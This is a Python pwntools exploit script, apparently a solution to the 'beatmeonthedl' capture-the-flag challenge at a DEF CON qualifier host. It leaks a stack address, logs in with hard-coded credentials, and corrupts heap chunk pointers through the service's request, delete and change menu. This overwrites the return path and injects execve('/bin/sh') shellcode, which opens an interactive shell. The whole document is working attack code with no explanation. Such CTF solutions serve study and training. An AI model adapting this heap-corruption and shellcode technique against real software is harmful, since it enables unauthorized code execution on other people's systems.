from pwn import *

context.log_level = "DEBUG"

#p = process('./beatmeonthedl')
p = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', 6969)
pause()

p.recvuntil('username: ')
p.sendline('A'*16)
p.recvuntil('user: ')
p.recvuntil('A'*16)
l = p.recvuntil('\n')[:-1]
l += '\x00' * (8-len(l))
stack_leak = u64(l)
print hex(stack_leak)

p.sendline('mcfly')
p.recvuntil('Pass: ')
p.sendline('awesnap')

p.recvuntil('| ')

def request(data):
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline(data)
    p.recvuntil('| ')

def delete(idx):
    p.sendline('3')
    p.recvuntil('choice: ')
    p.sendline(str(idx))
    p.recvuntil('| ')

def change(idx, data):
    p.sendline('4')
    p.recvuntil('choice: ')
    p.sendline(str(idx))
    p.recvuntil('data: ')
    p.sendline(data)
    p.recvuntil('| ')


request('A'*0x38)
request('B'*0x38)
request('C'*0x38)
request('D'*0x38)
request('E'*0x38)

delete(3)

change(2, 'F'*0x38 + p64(0x609ab8)*3)

request('G'*4)

delete(2)

change(1, 'H'*0x38 + p64(0x609ac0)*3)

main_ret_addr = stack_leak + 40

request(p64(main_ret_addr-0x18))


request('a'*24)

change(0, p64(0x609b88-0x18))

request('1'*4)

delete(1)

change(0, 'A'*0x3b + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

p.sendline('5')

p.interactive()
